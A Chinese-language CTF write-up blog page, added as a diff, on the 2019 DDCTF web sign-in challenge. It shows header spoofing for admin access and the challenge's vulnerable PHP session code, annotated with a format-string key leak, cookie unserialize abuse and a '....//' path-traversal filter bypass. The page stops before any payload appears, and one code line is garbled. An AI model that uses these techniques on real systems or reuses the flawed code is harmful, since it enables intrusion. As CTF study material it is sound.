@@ -1,0 +1,549 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/flash.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/flash.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-corner-indicator.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"www.ch4ser.top","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta property="og:type" content="article">
+<meta property="og:title" content="2019 DDCTF web ">
+<meta property="og:url" content="http://www.ch4ser.top/2019/05/11/2019-DDCTF-web/index.html">
+<meta property="og:site_name" content="ch4ser||自闭室">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://ch4ser.top/57f413fa-a730-4c47-916a-3b3cbfc5fc63.png6921654193029151238.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/40637063/56887796-12dafb80-6aa5-11e9-9181-aae6b45ea0ca.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/40637063/56887798-140c2880-6aa5-11e9-8fcf-44b7353af4da.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/40637063/56887802-14a4bf00-6aa5-11e9-853d-48cdb2ae8df4.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/40637063/57570602-6d297400-7436-11e9-9cfe-720761c4b08f.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/40637063/57570552-ebd1e180-7435-11e9-9c95-fed585cdd3a2.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/40637063/57570520-7e25b580-7435-11e9-988e-f68b0f04317e.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/40637063/57570547-d8267b00-7435-11e9-9551-fb9ef384c7fd.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/40637063/57570617-9944f500-7436-11e9-93c5-11b65904cd31.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/40637063/57571087-2474b980-743c-11e9-976a-480a59136d09.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/40637063/57571086-23dc2300-743c-11e9-90fc-a068dc33cbfa.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/40637063/57571120-73225380-743c-11e9-8178-e1f74c83a67a.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/40637063/57571078-f1322a80-743b-11e9-8ebe-099e2db550f7.png">
+<meta property="article:published_time" content="2019-05-11T05:58:05.000Z">
+<meta property="article:modified_time" content="2021-10-16T06:22:19.878Z">
+<meta property="article:author" content="ch4ser">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://ch4ser.top/57f413fa-a730-4c47-916a-3b3cbfc5fc63.png6921654193029151238.png">
+
+<link rel="canonical" href="http://www.ch4ser.top/2019/05/11/2019-DDCTF-web/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>2019 DDCTF web  | ch4ser||自闭室</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="ch4ser||自闭室" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">ch4ser||自闭室</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">(´・ω・｀)你瞅啥呢</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+  <a href="https://github.com/ch4ser-go" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://www.ch4ser.top/2019/05/11/2019-DDCTF-web/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/sabito.jpg">
+      <meta itemprop="name" content="ch4ser">
+      <meta itemprop="description" content="向阳十八载，回首也无晴">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ch4ser||自闭室">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          2019 DDCTF web 
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2019-05-11 13:58:05" itemprop="dateCreated datePublished" datetime="2019-05-11T13:58:05+08:00">2019-05-11</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-10-16 14:22:19" itemprop="dateModified" datetime="2021-10-16T14:22:19+08:00">2021-10-16</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%81%9A%E9%A2%98/" itemprop="url" rel="index"><span itemprop="name">做题</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p><img src="http://ch4ser.top/57f413fa-a730-4c47-916a-3b3cbfc5fc63.png6921654193029151238.png"></p>
+<span id="more"></span>
+
+<p>考试周结束，有时间来复现了。。。然鹅好像有题目崩了，java又没学过。。。只能复现一部分了。</p>
+<h2 id="web-签到题"><a href="#web-签到题" class="headerlink" title="web 签到题"></a>web 签到题</h2><p>点击，扫描，发现除了index.php 之外其他都需要登陆，抓包发现有发送<code>Auth.php</code>请求，其中有<code>didictf_username</code>字段，尝试添加成为<code>didictf_username: admin</code>。成功登陆。</p>
+<p>然后在返回包中显示出了一个<code>php文件</code>，尝试访问看到了<code>Session.php</code>的源代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">Application</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$path</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">response</span>(<span class="params"><span class="variable">$data</span>, <span class="variable">$errMsg</span> = <span class="string">&#x27;success&#x27;</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$ret</span> = [<span class="string">&#x27;errMsg&#x27;</span> =&gt; <span class="variable">$errMsg</span>,</span><br><span class="line">            <span class="string">&#x27;data&#x27;</span> =&gt; <span class="variable">$data</span>];</span><br><span class="line">        <span class="variable">$ret</span> = json_encode(<span class="variable">$ret</span>);</span><br><span class="line">        header(<span class="string">&#x27;Content-type: application/json&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$ret</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">auth</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$DIDICTF_ADMIN</span> = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_DIDICTF_USERNAME&#x27;</span>]) &amp;&amp; <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_DIDICTF_USERNAME&#x27;</span>] == <span class="variable">$DIDICTF_ADMIN</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;response(<span class="string">&#x27;您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">TRUE</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;response(<span class="string">&#x27;抱歉，您没有登陆权限，请获取权限后访问-----&#x27;</span>,<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">sanitizepath</span>(<span class="params"><span class="variable">$path</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$path</span> = trim(<span class="variable">$path</span>);<span class="comment">//去掉空格</span></span><br><span class="line">    <span class="variable">$path</span>=str_replace(<span class="string">&#x27;../&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$path</span>);<span class="comment">//过滤第一</span></span><br><span class="line">    <span class="variable">$path</span>=str_replace(<span class="string">&#x27;..\\&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$path</span>);<span class="comment">//过滤第二</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$path</span>;</span><br><span class="line">&#125;<span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;path)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$path</span> = <span class="keyword">$this</span>-&gt;sanitizepath(<span class="keyword">$this</span>-&gt;path);<span class="comment">// ....//config/flag.php</span></span><br><span class="line">        <span class="keyword">if</span>(strlen(<span class="variable">$path</span>) !== <span class="number">18</span>) &#123;<span class="comment">//../config/flag.php</span></span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;response(<span class="variable">$data</span>=file_get_contents(<span class="variable">$path</span>),<span class="string">&#x27;Congratulations&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;Application.php&#x27;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Session</span> <span class="keyword">extends</span> <span class="title">Application</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//key建议为8位字符串</span></span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$eancrykey</span>                  = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$cookie_expiration</span>			= <span class="number">7200</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$cookie_name</span>                = <span class="string">&#x27;ddctf_id&#x27;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$cookie_path</span>				= <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$cookie_domain</span>				= <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$cookie_secure</span>				= <span class="literal">FALSE</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$activity</span>                   = <span class="string">&quot;DiDiCTF&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">parent</span>::auth()) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;get_key();</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;session_read()) &#123;</span><br><span class="line">                <span class="variable">$data</span> = <span class="string">&#x27;DiDI Welcome you %s&#x27;</span>;</span><br><span class="line">                <span class="variable">$data</span> = sprintf(<span class="variable">$data</span>,<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>]);</span><br><span class="line">                <span class="built_in">parent</span>::response(<span class="variable">$data</span>,<span class="string">&#x27;sucess&#x27;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;session_create();</span><br><span class="line">                <span class="variable">$data</span> = <span class="string">&#x27;DiDI Welcome you&#x27;</span>;</span><br><span class="line">                <span class="built_in">parent</span>::response(<span class="variable">$data</span>,<span class="string">&#x27;sucess&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">get_key</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">//eancrykey  and flag under the folder</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;eancrykey =  file_get_contents(<span class="string">&#x27;../config/key.txt&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">session_read</span>(<span class="params"></span>) </span>&#123;<span class="comment">//target1: 绕过所有false</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$_COOKIE</span>)) &#123;</span><br><span class="line">             <span class="keyword">return</span> <span class="literal">FALSE</span>;</span><br><span class="line">        &#125;<span class="comment">//cookie not empty</span></span><br><span class="line"></span><br><span class="line">        <span class="variable">$session</span> = <span class="variable">$_COOKIE</span>[<span class="keyword">$this</span>-&gt;cookie_name];</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$session</span>)) &#123;</span><br><span class="line">            <span class="built_in">parent</span>::response(<span class="string">&quot;session not found&quot;</span>,<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">FALSE</span>;</span><br><span class="line">        &#125;<span class="comment">//ddctf_id 不能为空</span></span><br><span class="line"></span><br><span class="line">        <span class="variable">$hash</span> = substr(<span class="variable">$session</span>,strlen(<span class="variable">$session</span>)-<span class="number">32</span>);<span class="comment">//长度要大于32? 32位之后的内容</span></span><br><span class="line">        <span class="variable">$session</span> = substr(<span class="variable">$session</span>,<span class="number">0</span>,strlen(<span class="variable">$session</span>)-<span class="number">32</span>);<span class="comment">//一直截断到倒数第32位</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$hash</span> !== md5(<span class="keyword">$this</span>-&gt;eancrykey.<span class="variable">$session</span>)) &#123;<span class="comment">//key.txt 内容和 ddctf_id 内容片段拼接 再md5 等于ddctf_id32位之后的内容</span></span><br><span class="line">            <span class="built_in">parent</span>::response(<span class="string">&quot;the cookie data not match&quot;</span>,<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$session</span> = unserialize(<span class="variable">$session</span>);<span class="comment">//ddctf_id 反序列化</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!is_array(<span class="variable">$session</span>) <span class="keyword">OR</span> !<span class="keyword">isset</span>(<span class="variable">$session</span>[<span class="string">&#x27;session_id&#x27;</span>]) <span class="keyword">OR</span> !<span class="keyword">isset</span>(<span class="variable">$session</span>[<span class="string">&#x27;ip_address&#x27;</span>]) <span class="keyword">OR</span> !<span class="keyword">isset</span>(<span class="variable">$session</span>[<span class="string">&#x27;user_agent&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">FALSE</span>;</span><br><span class="line">        &#125;<span class="comment">//ddctf_id 反序列化之后的内容要有 session_id ip_address user_agent 再来个path??</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;nickname&quot;</span>])) &#123;</span><br><span class="line">            <span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="variable">$_POST</span>[<span class="string">&quot;nickname&quot;</span>],<span class="keyword">$this</span>-&gt;eancrykey);</span><br><span class="line">            <span class="variable">$data</span> = <span class="string">&quot;Welcome my friend %s&quot;</span>;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$arr</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>) &#123;</span><br><span class="line">                <span class="variable">$data</span> = sprintf(<span class="variable">$data</span>,<span class="variable">$v</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">parent</span>::response(<span class="variable">$data</span>,<span class="string">&quot;Welcome&quot;</span>);</span><br><span class="line">        &#125;<span class="comment">//sprint格式化打印函数利用，通过传递进参数nickname = %S 让它可以读取key。</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$session</span>[<span class="string">&#x27;ip_address&#x27;</span>] != <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) &#123;</span><br><span class="line">            <span class="built_in">parent</span>::response(<span class="string">&#x27;the ip addree not match&#x27;</span>.<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">FALSE</span>;</span><br><span class="line">        &#125;<span class="comment">//ip_address 要写自己的ip</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$session</span>[<span class="string">&#x27;user_agent&#x27;</span>] != <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>]) &#123;</span><br><span class="line">            <span class="built_in">parent</span>::response(<span class="string">&#x27;the user agent not match&#x27;</span>,<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">FALSE</span>;</span><br><span class="line">        &#125;<span class="comment">//user_agent 内容要和 http_user_agent的匹配</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">TRUE</span>;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="comment">//看起来可以动手脚的只有session_id?</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">session_create</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$sessionid</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">while</span>(strlen(<span class="variable">$sessionid</span>) &lt; <span class="number">32</span>) &#123;</span><br><span class="line">            <span class="variable">$sessionid</span> .= mt_rand(<span class="number">0</span>,mt_getrandmax());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$userdata</span> = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;session_id&#x27;</span> =&gt; md5(uniqid(<span class="variable">$sessionid</span>,<span class="literal">TRUE</span>)),</span><br><span class="line">            <span class="string">&#x27;ip_address&#x27;</span> =&gt; <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>],</span><br><span class="line">            <span class="string">&#x27;user_agent&#x27;</span> =&gt; <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>],</span><br><span class="line">            <span class="string">&#x27;user_data&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="variable">$cookiedata</span> = serialize($</span><br><span class="line">    );</span><br><span class="line">        <span class="variable">$cookiedata</span> = <span class="variable">$cookiedata</span>.md5(<span class="keyword">$this</span>-&gt;eancrykey.<span class="variable">$cookiedata</span>);</span><br><span class="line">        <span class="variable">$expire</span> = <span class="keyword">$this</span>-&gt;cookie_expiration + time();</span><br><span class="line">        setcookie(</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_name,</span><br><span class="line">            <span class="variable">$cookiedata</span>,</span><br><span class="line">            <span class="variable">$expire</span>,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_path,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_domain,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_secure</span><br><span class="line">            );</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$ddctf</span> = <span class="keyword">new</span> Session();</span><br><span class="line"><span class="variable">$ddctf</span>-&gt;index();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>得到<code>key</code>之后构造ddctfid:</p>
